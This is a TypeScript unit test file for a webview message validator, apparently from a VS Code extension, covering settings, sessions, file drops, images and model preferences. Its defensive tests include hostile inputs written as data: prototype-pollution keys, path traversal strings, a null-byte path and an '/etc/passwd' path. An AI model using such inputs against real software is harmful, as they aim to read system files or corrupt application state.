      parseWebviewMessage({
        type: 'vscode/open-settings',
        payload: { query: 'Varro' },
      })
    ).toEqual({ type: 'vscode/open-settings', payload: { query: 'Varro' } });

    expect(parseWebviewMessage({ type: 'vscode/open-settings', payload: {} })).toEqual({
      type: 'vscode/open-settings',
      payload: {},
    });
  });

  it('accepts providers/refresh without payload', () => {
    expect(parseWebviewMessage({ type: 'providers/refresh' })).toEqual({
      type: 'providers/refresh',
    });
    expect(parseWebviewMessage({ type: 'vscode/show-output' })).toEqual({
      type: 'vscode/show-output',
    });

    expect(
      parseWebviewMessage({ type: 'vscode/mermaid-preview', payload: { open: true } })
    ).toEqual({ type: 'vscode/mermaid-preview', payload: { open: true } });
    expect(
      parseWebviewMessage({ type: 'vscode/mermaid-preview', payload: { open: 'yes' } })
    ).toBeNull();
  });

  it('accepts embedded provider auth changes', () => {
    expect(parseWebviewMessage({ type: 'providers/auth-changed' })).toEqual({
      type: 'providers/auth-changed',
    });
    expect(parseWebviewMessage({ type: 'providers/reauthenticated' })).toBeNull();
  });

  it('accepts providers/watch with active state', () => {
    expect(parseWebviewMessage({ type: 'providers/watch', payload: { active: true } })).toEqual({
      type: 'providers/watch',
      payload: { active: true },
    });
  });

  it('accepts bounded permission reveal IDs', () => {
    expect(
      parseWebviewMessage({
        type: 'permission/reveal',
        payload: { permissionId: 'perm-1' },
      })
    ).toEqual({ type: 'permission/reveal', payload: { permissionId: 'perm-1' } });
    expect(
      parseWebviewMessage({ type: 'permission/reveal', payload: { permissionId: '' } })
    ).toBeNull();
  });

  it('accepts session export messages with a valid session id', () => {
    expect(
      parseWebviewMessage({ type: 'session/export', payload: { sessionId: 'session-1' } })
    ).toEqual({
      type: 'session/export',
      payload: { sessionId: 'session-1' },
    });

    expect(parseWebviewMessage({ type: 'session/export', payload: {} })).toBeNull();
  });

  it('accepts usage report requests', () => {
    expect(
      parseWebviewMessage({ type: 'usage/report', payload: { includeAllTime: true } })
    ).toEqual({ type: 'usage/report', payload: { includeAllTime: true } });
    expect(parseWebviewMessage({ type: 'usage/report' })).toBeNull();
  });

  it('parses every Ralph command and reconstructs nested legacy runs', () => {
    const config = createRalphConfig();
    const run = createRalphRun();

    expect(
      parseWebviewMessage({ type: 'ralph/start', payload: { config, ignored: true } })
    ).toEqual({ type: 'ralph/start', payload: { config } });

    for (const type of ['ralph/stop', 'ralph/pause', 'ralph/resume'] as const) {
      expect(parseWebviewMessage({ type, payload: { managerSessionId: 'manager-1' } })).toEqual({
        type,
        payload: { managerSessionId: 'manager-1' },
      });
    }

    expect(
      parseWebviewMessage({
        type: 'ralph/update-model',
        payload: {
          managerSessionId: 'manager-1',
          model: { providerID: 'anthropic', modelID: 'claude', variant: 'max' },
        },
      })
    ).toEqual({
      type: 'ralph/update-model',
      payload: {
        managerSessionId: 'manager-1',
        model: { providerID: 'anthropic', modelID: 'claude', variant: 'max' },
      },
    });
    expect(
      parseWebviewMessage({
        type: 'ralph/update-model',
        payload: { managerSessionId: 'manager-1', model: null },
      })
    ).toEqual({
      type: 'ralph/update-model',
      payload: { managerSessionId: 'manager-1', model: null },
    });

    expect(
      parseWebviewMessage({
        type: 'ralph/sync',
        payload: { legacyRuns: { 'manager-1': run } },
      })
    ).toEqual({
      type: 'ralph/sync',
      payload: { legacyRuns: { 'manager-1': run } },
    });
    expect(parseWebviewMessage({ type: 'ralph/sync', payload: {} })).toEqual({
      type: 'ralph/sync',
      payload: {},
    });
  });

  it('rejects malformed or unbounded Ralph command payloads', () => {
    const { workspaceDirectory: _workspaceDirectory, ...legacyConfig } = createRalphConfig();
    expect(
      parseWebviewMessage({ type: 'ralph/start', payload: { config: legacyConfig } })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'ralph/sync',
        payload: {
          legacyRuns: {
            'manager-1': {
              ...createRalphRun(),
              config: legacyConfig,
            },
          },
        },
      })
    ).toEqual({
      type: 'ralph/sync',
      payload: {
        legacyRuns: {
          'manager-1': {
            ...createRalphRun(),
            config: { ...legacyConfig, workspaceDirectory: null },
          },
        },
      },
    });
    expect(
      parseWebviewMessage({
        type: 'ralph/start',
        payload: { config: { ...createRalphConfig(), iterations: 1_000 } },
      })
    ).not.toBeNull();
    expect(
      parseWebviewMessage({
        type: 'ralph/start',
        payload: { config: { ...createRalphConfig(), iterations: 1_001 } },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'ralph/sync',
        payload: {
          legacyRuns: {
            'manager-1': {
              ...createRalphRun(),
              iterations: [{ ...createRalphRun().iterations[0], phase: 'unknown' }],
            },
          },
        },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'ralph/start',
        payload: {
          config: {
            ...createRalphConfig(),
            model: { providerID: 'openai', modelID: '' },
          },
        },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'ralph/stop',
        payload: { managerSessionId: 'x'.repeat(513) },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'ralph/update-model',
        payload: { managerSessionId: 'manager-1', model: {} },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'ralph/sync',
        payload: {
          legacyRuns: {
            'manager-1': { ...createRalphRun(), status: 'unknown' },
          },
        },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'ralph/sync',
        payload: {
          legacyRuns: Object.fromEntries(
            Array.from({ length: 101 }, (_, index) => [
              `manager-${index}`,
              {
                ...createRalphRun(),
                config: { ...createRalphConfig(), managerSessionId: `manager-${index}` },
              },
            ])
          ),
        },
      })
    ).toBeNull();
  });

  it('rejects reserved Ralph manager, legacy record, and nested session IDs', () => {
    expect(
      parseWebviewMessage({
        type: 'ralph/start',
        payload: { config: { ...createRalphConfig(), managerSessionId: 'constructor' } },
      })
    ).toBeNull();

    for (const type of ['ralph/stop', 'ralph/pause', 'ralph/resume'] as const) {
      expect(parseWebviewMessage({ type, payload: { managerSessionId: 'prototype' } })).toBeNull();
    }
    expect(
      parseWebviewMessage({
        type: 'ralph/update-model',
        payload: { managerSessionId: '__proto__', model: null },
      })
    ).toBeNull();

    const reservedRun = {
      ...createRalphRun(),
      config: { ...createRalphConfig(), managerSessionId: '__proto__' },
    };
    const legacyRuns = JSON.parse(`{"__proto__":${JSON.stringify(reservedRun)}}`) as Record<
      string,
      unknown
    >;
    expect(parseWebviewMessage({ type: 'ralph/sync', payload: { legacyRuns } })).toBeNull();

    expect(
      parseWebviewMessage({
        type: 'ralph/sync',
        payload: {
          legacyRuns: {
            'manager-1': {
              ...createRalphRun(),
              iterations: [{ ...createRalphRun().iterations[0], childSessionId: 'constructor' }],
            },
          },
        },
      })
    ).toBeNull();
  });

  it('enforces cumulative Ralph string, node, and path-entry budgets', () => {
    const sharedPrompt = 'x'.repeat(90_000);
    const stringHeavyRuns = Object.fromEntries(
      Array.from({ length: 100 }, (_, index) => {
        const managerSessionId = `manager-${index}`;
        return [
          managerSessionId,
          {
            config: {
              ...createRalphConfig(),
              managerSessionId,
              promptTemplate: sharedPrompt,
            },
            status: 'paused',
            currentIteration: 0,
            iterations: [],
            updatedAt: 100,
          },
        ];
      })
    );
    expect(
      parseWebviewMessage({
        type: 'ralph/sync',
        payload: { legacyRuns: stringHeavyRuns },
      })
    ).toBeNull();

    expect(
      parseWebviewMessage({
        type: 'ralph/start',
        payload: {
          config: {
            ...createRalphConfig(),
            ignored: Array.from({ length: 100_001 }, () => null),
          },
        },
      })
    ).toBeNull();

    const filesChanged = Array.from({ length: 21 }, (_, index) => `src/file-${index}.ts`);
    const pathHeavyRun = {
      ...createRalphRun(),
      config: { ...createRalphConfig(), iterations: 1_000 },
      currentIteration: 1_000,
      iterations: Array.from({ length: 1_000 }, (_, index) => ({
        index: index + 1,
        childSessionId: `child-${index}`,
        status: 'passed',
        startedAt: 100 + index,
        endedAt: 101 + index,
        filesChanged,
        verification: {},
      })),
    };
    expect(
      parseWebviewMessage({
        type: 'ralph/sync',
        payload: { legacyRuns: { 'manager-1': pathHeavyRun } },
      })
    ).toBeNull();
  });

  it('rejects malformed payloads for typed messages', () => {
    expect(parseWebviewMessage({ type: 'webview/focus', payload: { focused: 'yes' } })).toBeNull();
    expect(parseWebviewMessage({ type: 'providers/watch', payload: { active: 'yes' } })).toBeNull();

    expect(
      parseWebviewMessage({
        type: 'files/search',
        payload: { requestId: 1.5, query: 'src', limit: -1 },
      })
    ).toBeNull();

    expect(
      parseWebviewMessage({
        type: 'files/drop-content',
        payload: {
          files: [{ name: 'note.txt', content: 'Zm9v', size: 10 * 1024 * 1024 + 1 }],
        },
      })
    ).toBeNull();

    expect(
      parseWebviewMessage({
        type: 'config/update',
        payload: {
          desktopSessionPaneSide: 'bottom',
          defaultPermissionMode: 'full',
        },
      })
    ).toBeNull();

    expect(
      parseWebviewMessage({ type: 'log', payload: { msg: 'hello', level: 'debug' } })
    ).toBeNull();
  });

  it('validates workspace selection, command state, and session diff identity', () => {
    expect(parseWebviewMessage({ type: 'vscode/open-folder' })).toEqual({
      type: 'vscode/open-folder',
    });
    expect(parseWebviewMessage({ type: 'webview/reload' })).toEqual({
      type: 'webview/reload',
    });
    expect(
      parseWebviewMessage({ type: 'workspace/select', payload: { path: '/repo/packages/app' } })
    ).toEqual({ type: 'workspace/select', payload: { path: '/repo/packages/app' } });
    expect(
      parseWebviewMessage({
        type: 'commands/state',
        payload: {
          canAbort: true,
          canSwitchSessions: false,
          model: { providerID: 'openai', modelID: 'gpt-5.6-sol', variant: 'high' },
        },
      })
    ).toEqual({
      type: 'commands/state',
      payload: {
        canAbort: true,
        canSwitchSessions: false,
        model: { providerID: 'openai', modelID: 'gpt-5.6-sol', variant: 'high' },
      },
    });
    expect(
      parseWebviewMessage({
        type: 'commands/state',
        payload: { canAbort: false, canSwitchSessions: true, model: null },
      })
    ).toEqual({
      type: 'commands/state',
      payload: { canAbort: false, canSwitchSessions: true, model: null },
    });
    expect(
      parseWebviewMessage({
        type: 'vscode/open',
        payload: { path: 'src/app.ts', view: 'diff', sessionID: 'session-1' },
      })
    ).toEqual({
      type: 'vscode/open',
      payload: { path: 'src/app.ts', view: 'diff', sessionID: 'session-1' },
    });
    expect(
      parseWebviewMessage({
        type: 'commands/state',
        payload: { canAbort: 'yes', canSwitchSessions: false, model: null },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'commands/state',
        payload: { canAbort: false, canSwitchSessions: false, model: { providerID: 'openai' } },
      })
    ).toBeNull();
  });

  it('validates editor panel actions and routes', () => {
    expect(parseWebviewMessage({ type: 'chat/new-editor' })).toEqual({ type: 'chat/new-editor' });
    expect(
      parseWebviewMessage({
        type: 'session/open-in-editor',
        payload: { sessionId: 'session-1', title: 'Editor session' },
      })
    ).toEqual({
      type: 'session/open-in-editor',
      payload: { sessionId: 'session-1', title: 'Editor session' },
    });
    expect(
      parseWebviewMessage({
        type: 'editor/route-changed',
        payload: { route: { type: 'session', sessionId: 'session-2', title: 'Updated title' } },
      })
    ).toEqual({
      type: 'editor/route-changed',
      payload: { route: { type: 'session', sessionId: 'session-2', title: 'Updated title' } },
    });
    expect(
      parseWebviewMessage({
        type: 'editor/route-changed',
        payload: { route: { type: 'session', sessionId: '../foreign' } },
      })
    ).toBeNull();
  });

  it('validates dropped-content encoding, declared sizes, and aggregate limits', () => {
    expect(
      parseWebviewMessage({
        type: 'files/drop-content',
        payload: { files: [{ name: 'note.txt', content: 'aGVsbG8=', size: 5 }] },
      })
    ).toEqual({
      type: 'files/drop-content',
      payload: { files: [{ name: 'note.txt', content: 'aGVsbG8=', size: 5 }] },
    });

    expect(
      parseWebviewMessage({
        type: 'files/drop-content',
        payload: { files: [{ name: 'note.txt', content: 'aGVsbG8=', size: 4 }] },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'files/drop-content',
        payload: { files: [{ name: 'note.txt', content: '!!!!', size: 3 }] },
      })
    ).toBeNull();

    const threeMiB = Buffer.alloc(3 * 1024 * 1024).toString('base64');
    expect(
      parseWebviewMessage({
        type: 'files/drop-content',
        payload: {
          files: Array.from({ length: 17 }, (_, index) => ({
            name: `part-${index}.bin`,
            content: threeMiB,
            size: 3 * 1024 * 1024,
          })),
        },
      })
    ).toBeNull();
  });

  it('validates delegated image storage and release messages', () => {
    expect(
      parseWebviewMessage({
        type: 'images/store',
        payload: { id: 'image-1', name: 'image.png', content: 'YQ==', size: 1 },
      })
    ).toEqual({
      type: 'images/store',
      payload: { id: 'image-1', name: 'image.png', content: 'YQ==', size: 1 },
    });
    expect(
      parseWebviewMessage({
        type: 'images/release',
        payload: { paths: ['/tmp/image.png'], deferred: true, sessionId: 'session-1' },
      })
    ).toEqual({
      type: 'images/release',
      payload: { paths: ['/tmp/image.png'], deferred: true, sessionId: 'session-1' },
    });
    expect(
      parseWebviewMessage({
        type: 'images/store',
        payload: { id: 'image-1', name: 'image.png', content: 'YQ==', size: 2 },
      })
    ).toBeNull();
  });

  it('validates composer image persistence messages', () => {
    const message = {
      type: 'composer/images-update',
      payload: {
        images: [
          {
            id: 'image-1',
            url: 'data:image/png;base64,AA==',
            mime: 'image/png',
            filename: 'image.png',
            size: 1,
            contextFile: {
              path: '/tmp/varro/image.png',
              relativePath: 'image.png',
              type: 'file',
            },
          },
        ],
      },
    };

    expect(parseWebviewMessage(message)).toEqual(message);
    expect(
      parseWebviewMessage({
        type: 'composer/images-update',
        payload: { images: Array.from({ length: 6 }, () => message.payload.images[0]) },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'composer/images-update',
        payload: { images: [null] },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'composer/images-update',
        payload: {
          images: [
            {
              ...message.payload.images[0],
              contextFile: { path: '/tmp/image.png', relativePath: '', type: 'file' },
            },
          ],
        },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'composer/images-update',
        payload: {
          images: [
            {
              ...message.payload.images[0],
              contextFile: {
                path: '/tmp/image.png\0escape',
                relativePath: 'image.png',
                type: 'file',
              },
            },
          ],
        },
      })
    ).toBeNull();
  });

  it('accepts known message shapes from newer webview versions by ignoring extra fields', () => {
    expect(
      parseWebviewMessage({
        type: 'ready',
        version: '999',
        payload: { unsupported: true },
      })
    ).toEqual({ type: 'ready' });

    expect(
      parseWebviewMessage({
        type: 'vscode/open',
        version: '2',
        payload: {
          path: '/repo/src/app.ts',
          line: 12,
          kind: 'file',
          view: 'diff',
          requestId: 19,
          column: 7,
          selection: { startLine: 12, endLine: 14 },
        },
      })
    ).toEqual({
      type: 'vscode/open',
      payload: {
        path: '/repo/src/app.ts',
        line: 12,
        kind: 'file',
        view: 'diff',
        requestId: 19,
      },
    });

    expect(
      parseWebviewMessage({
        type: 'vscode/open',
        payload: { path: '/repo/src/app.ts', view: 'editor' },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'vscode/open',
        payload: { path: '/repo/src/app.ts', requestId: 'bad' },
      })
    ).toBeNull();
  });

  it('parses a ready document identity and rejects malformed identities', () => {
    expect(parseWebviewMessage({ type: 'ready', payload: { documentId: 7 } })).toEqual({
      type: 'ready',
      payload: { documentId: 7 },
    });
    expect(parseWebviewMessage({ type: 'ready', payload: { documentId: '7' } })).toBeNull();
  });

  it('rejects malformed URLs and unsafe path traversal in helper guards', () => {
    expect(isAllowedExternalUrl('not a url')).toBe(false);
    expect(isAllowedApiRequest('GET', '/session/../message')).toBe(false);
    expect(isAllowedApiRequest('POST', '/mcp/%2F/connect')).toBe(false);
  });
});

describe('parseWebviewMessage protocol coverage', () => {
  const entries = Object.entries(VALID_WEBVIEW_MESSAGES) as Array<
    [WebviewMessage['type'], WebviewMessage]
  >;

  it('has a fixture for every accepted message type', () => {
    expect(entries.map(([type]) => type).toSorted()).toEqual(
      Object.keys(WEBVIEW_MESSAGE_TYPES).toSorted()
    );
  });

  for (const [type, message] of entries) {
    it(`accepts a well-formed ${type}`, () => {
      // Round-trips through a structured clone the way the real bridge does,
      // so a fixture cannot accidentally pass by object identity.
      expect(parseWebviewMessage(structuredClone(message))).toEqual(message);
    });
  }

  /**
   * Types whose payload is optional by design: a missing or garbage payload
   * degrades to the no-payload form instead of dropping the message. Listing
   * them explicitly means a type cannot quietly join the set later.
   */
  const OPTIONAL_PAYLOAD_TYPES = new Set<WebviewMessage['type']>([
    'ready',
    'context/request',
    'providers/refresh',
    'providers/auth-changed',
    'terminal-selection/clear',
    'files/clear',
    'files/pick',
    'webview/reload',
    'vscode/open-folder',
    'vscode/show-output',
    'chat/new-editor',
    'vscode/open-settings',
    'server/restart',
  ]);

  it('tolerates a garbage payload only for the types that opt into it', () => {
    const tolerant = Object.keys(WEBVIEW_MESSAGE_TYPES).filter((type) =>
      [null, 'string', 42, true, []].some(
        (payload) => parseWebviewMessage({ type, payload }) !== null
      )
    );
    expect(tolerant.toSorted()).toEqual([...OPTIONAL_PAYLOAD_TYPES].toSorted());
  });

  for (const [type] of entries) {
    if (OPTIONAL_PAYLOAD_TYPES.has(type)) continue;
    it(`rejects ${type} with a non-object payload`, () => {
      for (const payload of [null, 'string', 42, true, []]) {
        expect(parseWebviewMessage({ type, payload })).toBeNull();
      }
      expect(parseWebviewMessage({ type })).toBeNull();
    });
  }
});

describe('parseWebviewMessage rejection paths', () => {
  it('rejects files/drop with unusable or oversized path lists', () => {
    expect(parseWebviewMessage({ type: 'files/drop', payload: { paths: '/a.ts' } })).toBeNull();
    expect(
      parseWebviewMessage({ type: 'files/drop', payload: { paths: ['/a.ts', 7] } })
    ).toBeNull();
    expect(parseWebviewMessage({ type: 'files/drop', payload: { paths: [''] } })).toBeNull();
    expect(
      parseWebviewMessage({ type: 'files/drop', payload: { paths: ['a'.repeat(4097)] } })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'files/drop',
        payload: { paths: Array.from({ length: 101 }, (_, index) => `/f${String(index)}.ts`) },
      })
    ).toBeNull();
  });

  it('accepts files/drop at the path-count boundary', () => {
    const paths = Array.from({ length: 100 }, (_, index) => `/f${String(index)}.ts`);
    expect(parseWebviewMessage({ type: 'files/drop', payload: { paths } })).toEqual({
      type: 'files/drop',
      payload: { paths },
    });
  });

  it('rejects file/read and files/remove without a usable path', () => {
    for (const type of ['file/read', 'files/remove'] as const) {
      expect(parseWebviewMessage({ type, payload: {} })).toBeNull();
      expect(parseWebviewMessage({ type, payload: { path: '' } })).toBeNull();
      expect(parseWebviewMessage({ type, payload: { path: 12 } })).toBeNull();
      expect(parseWebviewMessage({ type, payload: { path: 'a'.repeat(4097) } })).toBeNull();
    }
  });

  it('keeps file/read and files/remove as distinct types', () => {
    expect(parseWebviewMessage({ type: 'file/read', payload: { path: '/a.ts' } })).toEqual({
      type: 'file/read',
      payload: { path: '/a.ts' },
    });
    expect(parseWebviewMessage({ type: 'files/remove', payload: { path: '/a.ts' } })).toEqual({
      type: 'files/remove',
      payload: { path: '/a.ts' },
    });
  });

  it('rejects pdfs/store whose declared size disagrees with its base64 content', () => {
    expect(
      parseWebviewMessage({
        type: 'pdfs/store',
        payload: { id: 'pdf-1', name: 'a.pdf', content: 'YQ==', size: 99 },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'pdfs/store',
        payload: { id: '', name: 'a.pdf', content: 'YQ==', size: 1 },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'pdfs/store',
        payload: { id: 'pdf-1', name: '', content: 'YQ==', size: 1 },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'pdfs/store',
        payload: { id: 'pdf-1', name: 'a.pdf', content: 'YQ==', size: 1.5 },
      })
    ).toBeNull();
  });

  it('rejects queued-messages/release without a positive integer lease', () => {
    const base = { itemId: 'queued-1', sessionId: 'session-1' };
    expect(parseWebviewMessage({ type: 'queued-messages/release', payload: base })).toBeNull();
    for (const lease of [0, -1, 1.5, '4', Number.NaN]) {
      expect(
        parseWebviewMessage({ type: 'queued-messages/release', payload: { ...base, lease } })
      ).toBeNull();
    }
    expect(
      parseWebviewMessage({
        type: 'queued-messages/release',
        payload: { itemId: '', sessionId: 'session-1', lease: 4 },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'queued-messages/release',
        payload: { itemId: 'queued-1', sessionId: '', lease: 4 },
      })
    ).toBeNull();
  });

  it('requires session-plan-state/update to carry at least one tracked field', () => {
    expect(
      parseWebviewMessage({
        type: 'session-plan-state/update',
        payload: { sessionId: 'session-1' },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'session-plan-state/update',
        payload: { sessionId: 'session-1', skippedAt: Number.POSITIVE_INFINITY },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'session-plan-state/update',
        payload: { sessionId: 'session-1', agent: '   ' },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'session-plan-state/update',
        payload: { sessionId: 'session-1', skippedAt: null },
      })
    ).toEqual({
      type: 'session-plan-state/update',
      payload: { sessionId: 'session-1', skippedAt: null },
    });
  });

  it('parses bounded session unread state updates', () => {
    expect(
      parseWebviewMessage({
        type: 'session-unread-state/update',
        payload: { sessionId: 'session-1', kind: 'completed', unread: true, markerAt: 123 },
      })
    ).toEqual({
      type: 'session-unread-state/update',
      payload: { sessionId: 'session-1', kind: 'completed', unread: true, markerAt: 123 },
    });
    expect(
      parseWebviewMessage({
        type: 'session-unread-state/update',
        payload: { sessionId: 'session-1', kind: 'unknown', unread: true },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'session-unread-state/update',
        payload: { sessionId: 'session-1', kind: 'plan-ready', unread: 'yes' },
      })
    ).toBeNull();
    expect(
      parseWebviewMessage({
        type: 'session-unread-state/update',
        payload: { sessionId: 'session-1', kind: 'completed', unread: true, markerAt: NaN },
      })
    ).toBeNull();
  });

  it('rejects log messages without a message or with an unknown level', () => {
    expect(parseWebviewMessage({ type: 'log', payload: { msg: '' } })).toBeNull();
    expect(parseWebviewMessage({ type: 'log', payload: { msg: 'hi', level: 'debug' } })).toBeNull();
    expect(parseWebviewMessage({ type: 'log', payload: { msg: 'hi' } })).toEqual({
      type: 'log',
      payload: { msg: 'hi' },
    });
  });

  it('drops payloads supplied for payload-free message types', () => {
    expect(parseWebviewMessage({ type: 'files/clear', payload: { path: '/etc/passwd' } })).toEqual({
      type: 'files/clear',
    });
    expect(parseWebviewMessage({ type: 'files/pick', payload: { anything: true } })).toEqual({
      type: 'files/pick',
    });
    expect(parseWebviewMessage({ type: 'context/request', payload: 42 })).toEqual({
      type: 'context/request',
    });
  });

  it('rejects model-preferences/migrate without an object payload', () => {
    expect(parseWebviewMessage({ type: 'model-preferences/migrate' })).toBeNull();
    expect(parseWebviewMessage({ type: 'model-preferences/migrate', payload: [] })).toBeNull();
  });

  it('bounds oversized legacy model preferences during migration', () => {
    const oversized = 'x'.repeat(4_097);
    const parsed = parseWebviewMessage({
      type: 'model-preferences/migrate',
      payload: {
        modelVariantSelections: { valid: 'high', oversized },
        hiddenProviders: ['openai', oversized],
        hiddenModels: Array.from({ length: 10_001 }, (_, index) => `provider/model-${index}`),
        addedModels: [],
        pinnedModels: [],
        modelDisplayNames: { valid: 'Valid', [oversized]: 'Invalid' },
      },
    });

    expect(parsed).toEqual({
      type: 'model-preferences/migrate',
      payload: expect.objectContaining({
        modelVariantSelections: { valid: 'high' },
        hiddenProviders: ['openai'],
        hiddenModels: expect.any(Array),
        modelDisplayNames: { valid: 'Valid' },
      }),
    });
    if (parsed?.type === 'model-preferences/migrate') {
      expect(parsed.payload.hiddenModels).toHaveLength(10_000);
    }
  });
});
